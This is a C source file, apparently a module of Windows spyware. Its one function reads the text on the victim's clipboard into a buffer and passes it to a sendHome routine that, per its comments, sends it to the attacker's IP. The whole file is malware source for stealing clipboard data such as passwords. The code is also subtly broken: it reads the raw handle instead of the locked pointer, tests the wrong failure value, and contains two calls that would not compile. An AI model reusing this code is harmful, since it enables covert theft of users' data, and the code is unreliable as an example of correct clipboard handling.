#include "config.h"

int clipboard()
{
	//Buffer of 1000 chars to hold the contents of the clipboard.
	char buffer[1000];
	HANDLE handle;

	//Opens clipboard for examination and prevents other
	//applications from modifying the clipboard content.
	if (!OpenClipboard(NULL))
	{
		_tprintf(_T("ERROR: Can't open clipboard"));
		return 1;
	}

	//Retrieves data from the clipboard.
	//The clipboard must have been opened first.
	handle = GetClipboardData(CF_TEXT);
	if (handle == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("ERROR: GetClipboardData didn't return a handle properly."));
		return 1;
	}

	//Locks a global memory object.
	if (!GlobalLock(handle))
	{
		_tprintf(_T("ERROR: GetClipboardData didn't return a handle properly."));
		return 1;
	}

	//Writes Victim's clipboard contents to buffer.
	sprintf_s(buffer, 1000, "%s\n", (char*)handle);

	//Unlocks a global memory object.
	if (!GlobalUnlock(handle))
	{
		_tprintf(_T("ERROR: GlobalUnlock failed."));
		return 1;
	}

	//Closes clipboard and allows other applications to access  it.
	if (!CloseClipboard())
	{
		_tprintf(_T("ERROR: CloseClipboard failed.", ));
		return 1;
	}

	//Sends clipboard data to sendHome function 
	//to be sent to designated Attackers IP. 
	if (sendHome(buffer, 0))
	{
		_tprintf(_T("ERROR: sendHome function failed.", ));
		return 1;
	}

	return 0;
}